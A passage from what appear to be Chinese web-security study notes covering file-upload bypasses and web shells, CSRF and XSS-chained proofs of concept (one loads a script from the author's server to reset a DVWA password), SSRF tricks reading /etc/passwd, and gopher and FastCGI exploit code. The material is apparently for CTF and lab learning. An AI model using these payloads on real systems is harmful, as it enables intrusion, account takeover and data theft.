首先上传一个txt文件，其内容为一句话木马。然后在文件包含漏洞处引用那个文件名。如果不存在文件包含漏洞，但是可以上传PHP后缀的文件，只是检测了文件内容，那么可以上传一个PHP文件去包含那个txt文件。如：&lt;?php include(&quot;txt文件路径&quot;);?&gt;。 nginx解析漏洞nginx解析漏洞造成的原因在于将.php结尾的文件交给fastcgi处理，而当文件不存在时，php.ini配置文件中有一个cgi.fix_pathinfo=1, 导致当前文件不存在时就处理上层路径文件。最重要一点，php-fpm.conf中存在security.limit_extensions，它配置了fastcgi解析的类型，如果它的值为空，就会将jpg等图片文件当成PHP代码执行。因此，可以上传一个test.jpg文件，其内容为一句话木马，然后访问：xxx/test.jpg/test.php，由于test.php文件不存在，向上一级处理，即处理test.jpg，然后将test.jpg当成代码执行，从而成功上传恶意文件。 题目 防御很简单，设置：security.limit_extensions=.php，只允许解析PHP文件即可。 图片木马制作将一个php文件和jpg文件放在同一个目录下，打开命令行，cd到那个目录，敲命令：copy /b 1.jpg+1.php 或者 copy 1.jpg/b + 2.php /a test.jpg。 waf绕过 有些waf只校验一定大小的内容，那么可以构造一个大文件，前面都是垃圾内容，后面才是木马。 可以尝试多加一个filename=&quot;xxx.php&quot;。 在Content-Disposition中，尝试调换一下filename和name的位置。 尝试去掉双引号，如：filename=xxx.php, 或者将双引号变成单引号，如：filename=&#39;xxx.php&#39;。 在Content-Disposition中，尝试去掉form-data。 尝试增加一个boundary。 1234567------WebKitFormBoundaryj1oRYFW91eaj8Ex2Content-Disposition: form-data; name&#x3D;&quot;file_x&quot;; filename&#x3D;&quot;test.txt&quot;Content-Type: text&#x2F;javascript------WebKitFormBoundaryj1oRYFW91eaj8Ex2Content-Disposition: form-data; name&#x3D;&quot;file_x&quot;; filename&#x3D;&quot;test.php&quot;Content-Type: text&#x2F;javascript 尝试多个分号。 1Content-Disposition: form-data; name&#x3D;&quot;file_x&quot;;;; filename&#x3D;&quot;test.php&quot; 在boundary前添加任意字符（支持PHP） 1Content-Type: multipart&#x2F;form-data; bypassboundary&#x3D;----WebKitFormBoundaryj1oRYFW91eaj8Ex2 用换行拆分filename 12Content-Disposition: form-data; name&#x3D;&quot;file_x&quot;; filename&#x3D;&quot;test.php&quot; name和filename之间添加任意字符串 1Content-Disposition: name&#x3D;&quot;file_x&quot;; bypass waf upload; filename&#x3D;&quot;test.php&quot;; 尝试将POST请求修改为GET请求。 典型套路 CTF题目 首先更改Content-type为image/jpg，不行就观察文件名为1.php和1.jpg，二者结果不一，那么判断存在黑名单。还要增加图片头：GIF89a。上传文件名改成.user.ini，如果上传成功，说明允许。因此可以先上传一个带有一句话木马的test.jpg文件，发现检测到了&lt;?，因此不能用常见的一句话，使用&lt;script language=&quot;PHP&quot;&gt;system($_GET[&#39;id&#39;])&lt;/script&gt;。然后再上传.user.ini，它的内容为：php_value auto_prepend_file=test.jpg。再访问上传得到的路径/index.php?id=whoami即可。 网鼎杯某题 该题中，对上传的filename进行一个数组分割，因此可以增加多个boundary。而且使用reset函数获取第一个元素作为文件名字，因此filename[0]放在首位，值为shell；使用end函数来判断文件名后缀是否是jpg等从而绕过黑名单，因此使用filename[6]作为最后一个元素，其值为jpg，绕过黑名单；使用了count函数来计算文件后缀名的长度再减1作为文件名数组的下标，而php长度为3，在数组中下标从0开始，因此需要使用filename[2]。可惜这环境好像有点问题。 参考文章 绕过姿势 upload-labs通关记录","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"文件上传漏洞总结","slug":"文件上传漏洞总结","permalink":"https://ggyggy666.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"CSRF的常见情况及绕过姿势","slug":"CSRF的常见情况及绕过姿势","date":"2020-06-25T13:16:33.000Z","updated":"2020-06-27T09:27:02.154Z","comments":true,"path":"2020/06/25/CSRF的常见情况及绕过姿势/","link":"","permalink":"https://ggyggy666.github.io/2020/06/25/CSRF%E7%9A%84%E5%B8%B8%E8%A7%81%E6%83%85%E5%86%B5%E5%8F%8A%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/","excerpt":"今天学习CSRF漏洞。","text":"今天学习CSRF漏洞。 漏洞原理CSRF，跨站请求伪造，简单来讲，就是用户登录一个网站后，还没退出的时候，在同一个浏览器中点开了一个攻击者发送过来的恶意链接，导致用户在不知情的情况下执行了某些操作。这个漏洞利用的就是用户自己的身份，攻击者并不能登录该用户。 类型分为GET型和POST型。GET型只需要将执行那个操作的链接发送给受害者即可。POST还要用burp生成poc，放到自己的公网服务器上才能让用户点击访问到。但如果发现是POST型的，也可以试试用burp转变成GET型请求再去访问。因为可能后台接收是使用$_REQUEST,可以接收GET、POST。 验证方法最好用两个账号在两个浏览器测试。不然可能token绑定了账号，自己的账号可以进行CSRF，但换一个就不行了。（之前美团遇到的） 常见防御 验证referer。 使用csrf-token。 使用验证码。 使用JSON传输数据，并且验证了content-type。 绕过姿势 存在referer： 删除掉它，看回显的差异。 看是只判断了域名还是整个链接。如果只是判断了域名如baidu.com，可以找其它子域名然后发布攻击页面的那个链接。 可以找一个该网站的URL跳转漏洞。 如果只是判断了本网站的hostname，即完整的：www.baidu.com。但是没有判断它的位置，可以在自己服务器上新建一个文件，名字就叫：www.baidu.com，然后在该目录下新建文件，写入POC,就可以构造出：http://118.179.88.139/www.baidu.com/csrf.html。当然，也可以是那个文件名字叫域名即：www.baidu.com.html。burp也是可以生成POC的，只不过是要增加一个referer在开头的history.pushState中,这样就能带着特定的referer去访问了： 存在token。 使用xss获取token，具体看后面的内容。 测试token，看是否是真的随机，或者能否重用。 POST中的token，修改值会报错，但可以试着转换成GET型的，可能没有验证。 token存在时就验证，不存在时就不验证。因此可以试试删除整个token参数和值。 如果token没有绑定账号（用户会话），可以试试自己的账号的token直接生成POC。注册两个账号，一个生成POC后在另一个账号所在浏览器打开。 如果token没有绑定session会话，即csrftoken出现在cookie中，那么可以在一个账号中试一下，抓包后，修改cookie的值，导致会话注销，退出登录；但只修改token的值，只会拒绝token而不会退出，说明token没有严格绑定到会话。然后使用另一个账号，将一个账号的csrftoken值复制替换另一个账号的，观察是否正常执行（cookie里的和POST数据里的都要一起替换）。但是正常情况下生成的POC无法设置cookie从而替换，因此需要在页面找一下能set-Cookie的地方。比如搜索框中，输入一个test，然后在repeater中点击go，回显中存在set-Cookie，并且我们的输入也在里面。而且还需要CRLF注入，使用%0a%0d。构造POC的时候,使用img标签的src属性去加载那个注入cookie的URL，然后由于不是图片肯定会出错，触发onerror事件从而提交表单。条件太多，太难利用了。因此最好还是找个xss，然后用Ajax。 如果token同时出现在了cookie和POST数据中，并且如果他们的值都是一样的，那么很可能只是验证了传入的值和cookie中的值是否一样。利用方法跟上一个一样，只是将token值换成一样的。 读取JSON格式的数据主要有JSONP和CORS跨域读取。 JSONP绕过。JSONP的介绍：https://blog.csdn.net/hansexploration/article/details/80314948AJax无法跨域传输接收数据，但是js文件可以。JSON格式恰好被js支持，因此JSON格式的文件也是可以跨域的。加载跨域文件涉及到src属性，script,iframe,img都有。使用script标签，src加载远程JSON文件，同时传输一个callback的函数名进去，将JSON数据用（）包裹起来作为参数，方便处理数据。 JSONP绕过可以看这篇文章：https://xz.aliyun.com/t/5143DoraBox有个靶场。利用的POC是在：http://118.178.88.139/csrfJson.php。 CORS跨域首先，访问页面的时候需要看返回包中是否有一串JSON格式的数据，而且返回包的header中可能有： Access-Control-Allow-Origin: * Access-Control-Allow-Headers: X-Requested-With Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS第一个和第三个是必需的。*表示允许接收所有域，也可能是null或者特定域。 之后需要验证是否能跨域读取数据。打开phpstudy环境，访问：http://localhost:999/cors/cors/ContentHijackingLoader.html然后在：Target Page中填入目标链接。Type选择CORS iframe或者CORS Window。如果是POST型，还需要在POST Data里填入数据。之后直接点击Retrieve Contents，如果返回了JSON格式的数据，说明存在。但这只是验证存在，利用的话还需要额外写POC。POC在：http://118.178.88.139/cors.php JSON格式传输数据应对方法 常规方法：将json格式的数据放在input标签的name中，然后form标签中需要有：enctype=”text/plain”。但是要解析JSON格式的话，Content-Type须为：application/json。而form表单无法设置enctype=”application/json”,只能寄希望于服务器能解析。因此测试是否可以构造poc时，首先可以在原来的请求页面将Content-Type改为：text/plain，看是否还能正确回显。如果可以，就可以使用常规方法了。 如果不行，可以对每一个键值对都使用一个input标签。键为name值，值就是value的值。不需要form中的enctype。参考文章：https://xz.aliyun.com/t/6052 如果服务端没有验证传输进来的Content-type是否为：application/json, 可以试试用Ajax传输。可以自己设置Header，也就能设置Content-Type为application/json,就可以跨域。 &lt;html&gt; &lt;body&gt; &lt;script&gt; function submitRequest() { var xhr = new XMLHttpRequest(); xhr.open(&quot;POST&quot;, &quot;http://www.xxx.com/webnet/edit&quot;, true); xhr.setRequestHeader(&quot;Accept&quot;, &quot;*/*&quot;); xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;); xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json; charset=utf-8&quot;); xhr.withCredentials = true; xhr.send(JSON.stringify({&quot;pSpotId&quot;:&quot;120201&quot;,&quot;pSignTimes&quot;:&quot;70&quot;,&quot;pModuleID&quot;:&quot;207&quot;,&quot;pSceneid&quot;:&quot;120201007000046&quot;}); } &lt;/script&gt; &lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;Submit request&quot; onclick=&quot;submitRequest();&quot;/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 但如果验证了不能为：application/json,或者说会将application/json转变成其它的， 就只能用text/plain,由于CORS策略我们不能这样传输了，除非服务器允许超过自定义的Origin和在响应中为Access-Control-Allow-Credentials：true。并且没有其它防御措施。（如果限制死了不能跨域，那么放在我们服务器上的POC文件就无法成功跨域执行。我想，应该可以在同一个域中找个上传点能上传HTML文件的。）4. JSON格式的闭合：首先正常的burp生成POC，然后浏览器打开，点击提交时抓包，如果看到POST传输的数据中是： {&quot;appId&quot;:&quot;300016001555&quot;,&quot;appName&quot;:&quot;0xdawnnn&quot;}=由于多了一个=，如果直接把这些JSON格式数据放在input中的name里，服务器是无法解析的。因此需要构造： &lt;input type=&quot;hidden&quot; name=&#39;{&quot;appId&quot;:&quot;300016001555&quot;,&quot;appName&quot;:&quot;0xdawnnn&quot;,&quot;test&quot;:&quot;&#39; value=&#39;test&quot;}&#39; /&gt;test属性和值都是自己加的。5. 由于flash就要不支持了，所以flash的绕过不学了。 具体参考：https://xz.aliyun.com/t/7911 XSS与CSRF组合 对于一个self-xss，可以看该处是否还存在CSRF。填入xss的payload后，抓包生成POC，浏览器打开。 利用XSS执行CSRF。XSS的payload可以是script标签，那么就可以在script标签的内容里构造Ajax请求，去执行相应地方的CSRF。此时，不会受到同源限制。如果那个CSRF的地方有token，那么可以先获得token，然后发送Ajax。 var req = new XMLHttpRequest(); req.onload = handleResponse; req.open(&apos;get&apos;,&apos;/email&apos;,true); req.send(); function handleResponse() { var token = this.responseText.match(/name=&quot;csrf&quot; value=&quot;(\\w+)&quot;/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open(&apos;post&apos;, &apos;/email/change-email&apos;, true); changeReq.send(&apos;csrf=&apos;+token+&apos;&amp;email=test@test.com&apos;) };dvwa的high等级这是GET型的，如果没有同源策略，payload应该是： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head lang=&quot;en&quot;&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; //获取用户的token，并设置为表单中的token，然后提交修改密码的表单 function attack() { document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value; document.getElementById(&quot;transfer&quot;).submit(); } &lt;/script&gt; &lt;/head&gt; &lt;body onload=&quot;attack()&quot;&gt; &lt;ifram src=&quot;http://192.168.10.14/dvwa/vulnerabilities/csrf/&quot; id=&quot;hack&quot; style=&quot;display:none;&quot;&gt; &lt;!--在该网页内打开另一个网页--&gt; &lt;/ifram&gt; &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.10.14/dvwa/vulnerabilities/csrf/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;admin&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;admin&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;但是有同源策略，就只能用xss了。弹出token： &lt;ifram src=&quot;../csrf/&quot; onload=alert(frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value)&gt;&lt;/ifram&gt;不过弹出token也没啥用，最后还是得用上面的xss与CSRF的POC（要修改）。如下： var f = document.createElement(&quot;ifram&quot;); f.src = &quot;http://localhost:999/dvwa/vulnerabilities/csrf/&quot;; f.style = &quot;opacity:0&quot;; f.onload = handleResponse; document.body.appendChild(f); function handleResponse(){ var token = frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value; var changeReq = new XMLHttpRequest(); changeReq.open(&apos;get&apos;, &apos;http://localhost:999/dvwa/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change&amp;user_token=&apos;+token, true); changeReq.send(); }保存在服务器中了。只需要xss漏洞中使用：&lt;script src=&quot;http://118.178.88.139/dvwaCsrf.js&quot;&gt;&lt;/script&gt; 注意必须使用document.body.appendChild(f)将iframe标签加入body的DOM结构中。 注意，由于防止代码被执行，iframe变成了ifram","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"CSRF的常见情况及绕过姿势","slug":"CSRF的常见情况及绕过姿势","permalink":"https://ggyggy666.github.io/tags/CSRF%E7%9A%84%E5%B8%B8%E8%A7%81%E6%83%85%E5%86%B5%E5%8F%8A%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"SSRF的常见情况及绕过等","slug":"SSRF的常见情况及绕过等","date":"2020-06-24T06:40:17.000Z","updated":"2021-02-21T12:32:59.737Z","comments":true,"path":"2020/06/24/SSRF的常见情况及绕过等/","link":"","permalink":"https://ggyggy666.github.io/2020/06/24/SSRF%E7%9A%84%E5%B8%B8%E8%A7%81%E6%83%85%E5%86%B5%E5%8F%8A%E7%BB%95%E8%BF%87%E7%AD%89/","excerpt":"这两天学习SSRF漏洞。","text":"这两天学习SSRF漏洞。 漏洞原理SSRF，服务器请求伪造。用户可以根据网站提供的一些服务利用服务器作为跳板向内网的服务发起请求并攻击。简单来说，攻击者不能直接访问内网，但网站所在的服务器提供了向内网请求一些资源的功能，并且对资源链接没有进行充分的过滤，导致攻击者可以构造链接，利用服务器向内网发起攻击。 漏洞危害 可以读取内网文件。 可以扫描内网端口是否开放。 可以识别内网部署的服务并攻击。 DOS攻击（请求大文件，始终保持连接）。 常见地方其实就是参数值中出现链接的地方。 根据链接加载图片、下载图片。 分享、收藏时出现一个链接指向分享的东西。 远程文件包含 邮件系统 在线翻译 PDF转换 关键字share, wap, url, link, src, source, target, u, 3g, display, sourceURL, imageURL, domain… 绕过 限制了域名，使用: http://baidu.com@xxx.com。如果还使用了parse_url限制了主机名，可考虑：http://baidu.com@xxx.com@xxx.com。原因是：parse_url与curl获取的主机名有差异，比如上面这个，parse_url获取的就会是最后一个@后面的域名，而curl获取的是第一个@后的域名。因此，如果内网判断出URL地址是内网地址就返回错误，但我们又想读取内网的文件。那就可以构造出：?url=http://foo@127.0.0.1:80@baidu.com。注意@后面的是主机名和端口，不要加协议，127.0.0.1后面跟80端口,foo是任意的。使用baidu.com绕过了对内网地址的检测，但是服务端用curl发起请求的却是127.0.0.1，绕过成功。如果失败，尝试：?url=http://foo@[127.0.0.1:8]0@baidu.com 或者：?url=http://foo@127.0.0.1:80+@baidu.com POST型用+，GET型直接用空格。 使用短网址。http://dwz.cn 使用域名.xip.io 解析为：域名 使用进制转换。比如127.0.0.1，八进制：0177.0.0.1，十六进制：0x7f.0.0.1，十进制：2130706433。可以先将四个部分分别转换成十六进制，合在一块再转换成八进制十进制等。 使用：https://tinyurl.com 进行生成302跳转地址。 加端口号，如80 127.0.0.1 换成Localhost,或者使用[::]替换localhost. 文件上传地方，将type=file修改成: type=url。 利用Enclosed alphanumerics, 奇怪的编码。 .号替换成句号。 利用协议。file,dict,gopher等。 DNS重绑定。使用ceye.io。原理：利用两次DNS解析。构造出：?url=xxx 后，率先将xxx解析成ip然后校验是否是内网地址，此时是第一次解析。如果设置TTL=0，就没有缓存此处解析，因此之后服务端向该链接发起请求时还需第二次DNS解析。由于第一次已经通过了验证，第二次就可以把域名重新解析到我们想要使用的URL。如此成功绕过。只是ceye的成功率太低了。 详见：https://www.secpulse.com/archives/65832.html 协议的使用 利用http探测窗口：?url=http://内网地址:$80$使用burp爆破端口号，看返回包。 使用file://读取文件：?url=file:///etc/passwd 使用dict获取一些配置信息：?url=dict://地址:端口/info也可以用dict探测端口：?url=dict://地址:端口 使用gopher发送POST请求：?url=gopher://地址:端口/_test接收到的是test。是从第二个开始接收的，因此没有_. gopher打mysql。有点难，还不会。 CTFHubPOST请求构造POST请求: 123456POST &#x2F;flag.php HTTP&#x2F;1.1Host: 127.0.0.1:80Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 36key&#x3D;efbbeb88ed4f6c33d1c94865621e592f 注意长度36，是POST的数据的长度。然后编码: http://ctf.ssleye.com/url.html 先在这个网站中进行一次编码，得到: 12 POST%20&#x2F;flag.php%20HTTP&#x2F;1.1%0AHost%3A%20127.0.0.1%3A80%0AContent-Type%3A%20application&#x2F;x-www-form-urlencoded%0AContent-Length%3A%2036%0A%0Akey%3Defbbeb88ed4f6c33d1c94865621e592f 然后复制到sublime中，将%0A替换成%0D%0A。 1POST%20&#x2F;flag.php%20HTTP&#x2F;1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Type%3A%20application&#x2F;x-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0A%0D%0Akey%3Defbbeb88ed4f6c33d1c94865621e592f 将上述内容再次编码： 1POST%2520&#x2F;flag.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Defbbeb88ed4f6c33d1c94865621e592f 再次编码： 1POST%252520&#x2F;flag.php%252520HTTP&#x2F;1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application&#x2F;x-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253Defbbeb88ed4f6c33d1c94865621e592f 最后访问: 1&#x2F;?url&#x3D;127.0.0.1:80&#x2F;index.php&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%252520&#x2F;flag.php%252520HTTP&#x2F;1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application&#x2F;x-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253Defbbeb88ed4f6c33d1c94865621e592f 成功得到flag。 上传文件上传一个文件 123456789101112131415161718192021222324POST &#x2F;flag.php HTTP&#x2F;1.1Host: challenge-ece20ada7a8110dd.sandbox.ctfhub.com:10080Content-Length: 276Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;challenge-ece20ada7a8110dd.sandbox.ctfhub.com:10080Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryE1uwjmM2ocz3z7B8User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.146 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;challenge-ece20ada7a8110dd.sandbox.ctfhub.com:10080&#x2F;?url&#x3D;127.0.0.1&#x2F;flag.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close------WebKitFormBoundaryE1uwjmM2ocz3z7B8Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.txt&quot;Content-Type: text&#x2F;plain11------WebKitFormBoundaryE1uwjmM2ocz3z7B8Content-Disposition: form-data; name&#x3D;&quot;gg&quot;鎻愪氦------WebKitFormBoundaryE1uwjmM2ocz3z7B8-- 进行一次编码，然后将%0A替换成%0D%0A, 再进行两次编码，得到： 1POST%252520&#x2F;flag.php%252520HTTP&#x2F;1.1%25250D%25250AHost%25253A%252520challenge-ece20ada7a8110dd.sandbox.ctfhub.com%25253A10080%25250D%25250AContent-Length%25253A%252520276%25250D%25250ACache-Control%25253A%252520max-age%25253D0%25250D%25250AUpgrade-Insecure-Requests%25253A%2525201%25250D%25250AOrigin%25253A%252520http%25253A&#x2F;&#x2F;challenge-ece20ada7a8110dd.sandbox.ctfhub.com%25253A10080%25250D%25250AContent-Type%25253A%252520multipart&#x2F;form-data%25253B%252520boundary%25253D----WebKitFormBoundaryE1uwjmM2ocz3z7B8%25250D%25250AUser-Agent%25253A%252520Mozilla&#x2F;5.0%252520%252528Windows%252520NT%25252010.0%25253B%252520Win64%25253B%252520x64%252529%252520AppleWebKit&#x2F;537.36%252520%252528KHTML%25252C%252520like%252520Gecko%252529%252520Chrome&#x2F;88.0.4324.146%252520Safari&#x2F;537.36%25250D%25250AAccept%25253A%252520text&#x2F;html%25252Capplication&#x2F;xhtml%25252Bxml%25252Capplication&#x2F;xml%25253Bq%25253D0.9%25252Cimage&#x2F;avif%25252Cimage&#x2F;webp%25252Cimage&#x2F;apng%25252C%25252A&#x2F;%25252A%25253Bq%25253D0.8%25252Capplication&#x2F;signed-exchange%25253Bv%25253Db3%25253Bq%25253D0.9%25250D%25250AReferer%25253A%252520http%25253A&#x2F;&#x2F;challenge-ece20ada7a8110dd.sandbox.ctfhub.com%25253A10080&#x2F;%25253Furl%25253D127.0.0.1&#x2F;flag.php%25250D%25250AAccept-Encoding%25253A%252520gzip%25252C%252520deflate%25250D%25250AAccept-Language%25253A%252520zh-CN%25252Czh%25253Bq%25253D0.9%25250D%25250AConnection%25253A%252520close%25250D%25250A%25250D%25250A------WebKitFormBoundaryE1uwjmM2ocz3z7B8%25250D%25250AContent-Disposition%25253A%252520form-data%25253B%252520name%25253D%252522file%252522%25253B%252520filename%25253D%2525221.txt%252522%25250D%25250AContent-Type%25253A%252520text&#x2F;plain%25250D%25250A%25250D%25250A11%25250D%25250A------WebKitFormBoundaryE1uwjmM2ocz3z7B8%25250D%25250AContent-Disposition%25253A%252520form-data%25253B%252520name%25253D%252522gg%252522%25250D%25250A%25250D%25250A%2525E9%25258E%2525BB%2525E6%252584%2525AA%2525E6%2525B0%2525A6%25250D%25250A------WebKitFormBoundaryE1uwjmM2ocz3z7B8--%25250D%25250A 之后访问: 1&#x2F;?url&#x3D;127.0.0.1&#x2F;index.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST... 注意必须要加80端口才行。 FastCGI手动这题是真难。。了解: https://blog.csdn.net/mysteryflower/article/details/94386461 参考了两篇wp: https://blog.csdn.net/rfrder/article/details/108589988 https://www.soapffz.com/sec/ctf/566.html 按照他们的步骤ls /没有执行成功。。 nc -lvvp 9000 &gt; 1.txt, 监听9000端口，fastCGI是这个端口。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251import socketimport randomimport argparseimport sysfrom io import BytesIO# Referrer: https:&#x2F;&#x2F;github.com&#x2F;wuyunfeng&#x2F;Python-FastCGI-ClientPY2 &#x3D; True if sys.version_info.major &#x3D;&#x3D; 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(&#39;utf-8&#39;, &#39;strict&#39;)def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s &#x3D; str(s, &#39;utf-8&#39;, &#39;strict&#39;) else: s &#x3D; str(s) return sclass FastCGIClient: &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot; # private __FCGI_VERSION &#x3D; 1 __FCGI_ROLE_RESPONDER &#x3D; 1 __FCGI_ROLE_AUTHORIZER &#x3D; 2 __FCGI_ROLE_FILTER &#x3D; 3 __FCGI_TYPE_BEGIN &#x3D; 1 __FCGI_TYPE_ABORT &#x3D; 2 __FCGI_TYPE_END &#x3D; 3 __FCGI_TYPE_PARAMS &#x3D; 4 __FCGI_TYPE_STDIN &#x3D; 5 __FCGI_TYPE_STDOUT &#x3D; 6 __FCGI_TYPE_STDERR &#x3D; 7 __FCGI_TYPE_DATA &#x3D; 8 __FCGI_TYPE_GETVALUES &#x3D; 9 __FCGI_TYPE_GETVALUES_RESULT &#x3D; 10 __FCGI_TYPE_UNKOWNTYPE &#x3D; 11 __FCGI_HEADER_SIZE &#x3D; 8 # request state FCGI_STATE_SEND &#x3D; 1 FCGI_STATE_ERROR &#x3D; 2 FCGI_STATE_SUCCESS &#x3D; 3 def __init__(self, host, port, timeout, keepalive): self.host &#x3D; host self.port &#x3D; port self.timeout &#x3D; timeout if keepalive: self.keepalive &#x3D; 1 else: self.keepalive &#x3D; 0 self.sock &#x3D; None self.requests &#x3D; dict() def __connect(self): self.sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock &#x3D; None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length &#x3D; len(content) buf &#x3D; bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen &#x3D; len(name) vLen &#x3D; len(value) record &#x3D; b&#39;&#39; if nLen &lt; 128: record +&#x3D; bchr(nLen) else: record +&#x3D; bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record +&#x3D; bchr(vLen) else: record +&#x3D; bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header &#x3D; dict() header[&#39;version&#39;] &#x3D; bord(stream[0]) header[&#39;type&#39;] &#x3D; bord(stream[1]) header[&#39;requestId&#39;] &#x3D; (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header[&#39;contentLength&#39;] &#x3D; (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header[&#39;paddingLength&#39;] &#x3D; bord(stream[6]) header[&#39;reserved&#39;] &#x3D; bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header &#x3D; buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record &#x3D; self.__decodeFastCGIHeader(header) record[&#39;content&#39;] &#x3D; b&#39;&#39; if &#39;contentLength&#39; in record.keys(): contentLength &#x3D; int(record[&#39;contentLength&#39;]) record[&#39;content&#39;] +&#x3D; buffer.read(contentLength) if &#39;paddingLength&#39; in record.keys(): skiped &#x3D; buffer.read(int(record[&#39;paddingLength&#39;])) return record def request(self, nameValuePairs&#x3D;&#123;&#125;, post&#x3D;&#39;&#39;): if not self.__connect(): print(&#39;connect failure! please check your fasctcgi-server !!&#39;) return requestId &#x3D; random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] &#x3D; dict() request 